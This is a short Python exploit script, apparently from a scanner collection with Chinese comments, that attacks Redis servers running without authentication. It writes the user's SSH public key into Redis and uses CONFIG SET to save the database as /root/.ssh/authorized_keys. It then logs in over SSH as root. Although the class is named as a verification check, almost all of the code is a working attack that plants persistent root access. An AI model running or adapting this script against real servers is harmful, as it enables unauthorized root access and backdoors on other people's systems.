#!/usr/bin/env python3

'''
name: Redis 利用未授权获取shell漏洞
description: Redis 利用未授权获取shell漏洞
'''

import os
import sys
import os.path
from urllib.parse import urlparse

class Redis_Shell_BaseVerify:
    def __init__(self, url):
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = '6379'
        self.PATH='/usr/bin/redis-cli'
        self.PATH1='/usr/local/bin/redis-cli'
        self.username = 'root'

    def ssh_connection(self):
        shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + self.username + "@" + self.host
        os.system(shell)

    def run(self):
        if os.path.isfile(self.PATH) or os.path.isfile(self.PATH1):
            try:
                print ("\t SSH Keys Need to be Generated")
                os.system('ssh-keygen -t rsa -C \"acid_creative\"')
                print ("\t Keys Generated Successfully")
                os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
                #cmd = "redis-cli -h " + self.host + ' flushall'
                cmd1 = "redis-cli -h " + self.host
                #os.system(cmd)
                cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  self.host + ' -x set cracklist'
                os.system(cmd2)
                cmd3 = cmd1 + ' config set dbfilename "backup.db" '
                cmd4 = cmd1 + ' config set  dir /'  + self.username + "/.ssh"
                cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
                cmd6 = cmd1 + ' save'
                os.system(cmd3)
                os.system(cmd4)
                os.system(cmd5)
                os.system(cmd6)
                print ("\tYou'll get shell in sometime..Thanks for your patience")
                self.ssh_connection()
                return True
            except Exception as e:
                print(e)
                print("不存在Redis 写入SSH公钥漏洞")
                return False
            finally:
                pass
        else:
            print("不存在Redis 写入SSH公钥漏洞")
            return False

if __name__ == "__main__":
    Redis_Shell = Redis_Shell_BaseVerify('http://127.0.0.1：6379')
    Redis_Shell.run()